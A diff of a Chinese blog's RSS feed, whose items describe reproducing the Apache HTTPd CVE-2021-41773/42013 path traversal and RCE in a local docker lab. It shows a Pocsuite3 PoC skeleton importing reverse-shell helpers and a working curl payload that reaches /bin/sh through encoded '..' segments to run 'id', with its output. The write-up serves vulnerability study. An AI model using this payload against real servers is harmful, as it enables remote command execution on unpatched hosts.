@@ -33,7 +33,7 @@ Pocsuite3可以进行批量验证、攻击，它有三种模式verify（验证�
 使用%2e即可
 实验发现不行，它会在编码之前先解码一次，解码之后会将..删除，所以换了urllib库。
  导入包 编写 PoC 实现类 DemoPOC，继承自 PoCBase 类
-from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD from pocsuite3.lib.utils import random_str class DemoPOC(POCBase): ...  PoC信息字段填写 vulID = &#39;0&#39; # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0 version = &#39;1.0&#39; # 默认为1 author = &#39;Oulaa&#39; # PoC 作者的大名 vulDate = &#39;2021-10-5&#39; # 漏洞公开的时间，不知道就写今天 createDate = &#39;2021-10-5&#39; # 编写 PoC 的日期 updateDate = &#39;2021-10-5&#39; # PoC 更新的时间，默认和编写时间一样 references = [] # 漏洞地址来源，0day 不用写 name = &#39;CVE-2021-41773/CVE-2021-42013 Apache HTTPd (2.</description>
+1 2 3 4 5 6 7 8  from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD from pocsuite3.lib.utils import random_str class DemoPOC(POCBase): ...   PoC信息字段填写 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  vulID = &amp;#39;0&amp;#39; # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0 version = &amp;#39;1.</description>
     </item>
     
     <item>
@@ -43,13 +43,13 @@ from pocsuite3.api import Output, POCBase, register_poc, requests, logger from p
       
       <guid>/posts/41773/</guid>
       <description>一、 复现环境 https://github.com/blasty/CVE-2021-41773
-docker-compose build &amp;amp;&amp;amp; docker-compose up -d  二、目录穿越  不能在浏览器复现，会被自动去掉..
+1  docker-compose build &amp;amp;&amp;amp; docker-compose up -d   二、目录穿越  不能在浏览器复现，会被自动去掉..
  三、RCE 前提：
 安装Apache之后，默认并不包含cgi 模块，需要我们自行安装以完成cgi解析，那么有没有可能在启用mod_cgi模块的前提下，实现RCE呢？
 所以前提是启用mod_cgid和mod_cgi模块。
 Linux上的apache实现回显RCE： 在linux上直接可以：
-curl -s --path-as-is -d &#39;echo Content-Type: text/plain; echo; id&#39; &amp;quot;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;quot; uid=33(www-data) gid=33(www-data) groups=33(www-data)  使用burp：
-echo Content-Type: text/plain;echo;id  原理：
+1 2  curl -s --path-as-is -d &amp;#39;echo Content-Type: text/plain; echo; id&amp;#39; &amp;#34;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;#34; uid=33(www-data) gid=33(www-data) groups=33(www-data)   使用burp：
+1  echo Content-Type: text/plain;echo;id   原理：
 直接执行命令无回显的且报500：
 原因是ap_scan_script_header_err_core_ex函数主要负责从cgi处理结果中读取输入，并确保输出格式符合一定要求。大体来说就是解析后的结果必须符合http协议规范，我们知道http请求分为header和body，且中间需要使用\r\n进行分割。
 也就是说，apache将cgi解析结果作为了http响应包的一部分。
